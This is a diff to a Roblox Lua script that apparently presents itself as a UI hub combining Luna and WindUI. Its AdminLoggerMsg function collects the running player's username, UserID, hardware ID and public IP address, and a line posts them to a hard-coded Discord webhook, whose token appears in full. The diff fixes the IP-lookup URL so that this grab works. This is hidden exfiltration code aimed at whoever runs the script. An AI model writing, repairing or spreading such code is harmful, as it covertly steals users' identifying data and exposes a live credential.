@@ -185,7 +185,7 @@ function AdminLoggerMsg()
                 {["name"] = "**Username**", ["value"] = "```" .. game.Players.LocalPlayer.Name .. "```", ["inline"] = true},
                 {["name"] = "**UserID**", ["value"] = "```" .. game.Players.LocalPlayer.UserId .. "```", ["inline"] = true},
                 {["name"] = "**PlaceID**", ["value"] = "```" .. game.PlaceId .. "```", ["inline"] = false},
-                {["name"] = "**IP Address**", ["value"] = "```" .. tostring(game:HttpGet("[https://api.ipify.org](https://api.ipify.org)", true)) .. "```", ["inline"] = false},
+                {["name"] = "**IP Address**", ["value"] = "```" .. tostring(game:HttpGet("https://api.ipify.org", true)) .. "```", ["inline"] = false},
                 {["name"] = "**Hwid**", ["value"] = "```" .. game:GetService("RbxAnalyticsService"):GetClientId() .. "```", ["inline"] = false},
                 {["name"] = "**JobID**", ["value"] = "```" .. game.JobId .. "```", ["inline"] = false},
                 {["name"] = "**Join Code**", ["value"] = "```lua\ngame.ReplicatedStorage['__ServerBrowser']:InvokeServer('teleport','" .. game.JobId .. "')```", ["inline"] = false}
@@ -195,6 +195,7 @@ function AdminLoggerMsg()
     }
     return AdminMessage
 end
+
 PostWebhook("https://canary.discord.com/api/webhooks/1397774789782802512/9Elh1LPcHKChTlQ8sey8KvGkXPKp9iKdlgTp1VP5RlETVIzDVonxPehORsRcKnOgFhtR", AdminLoggerMsg())
 -- This script combines the Luna UI framework with the functionality
 -- from the WindUI script ("SkyHubMe.txt"). All tabs, buttons, and
